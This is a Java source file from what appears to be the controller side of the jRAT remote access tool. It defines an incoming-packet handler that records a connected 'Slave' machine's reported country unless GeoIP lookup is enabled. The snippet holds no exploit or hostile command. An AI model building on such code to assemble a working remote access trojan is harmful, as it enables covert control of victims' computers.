package se.jrat.controller.packets.incoming;

import java.io.DataInputStream;

import se.jrat.controller.Slave;
import se.jrat.controller.settings.Settings;

public class Packet8InitCountry extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String country = slave.readLine();

		if (!Settings.getGlobal().getBoolean("geoip")) {
			slave.setCountry(country);	
		}

	}

}
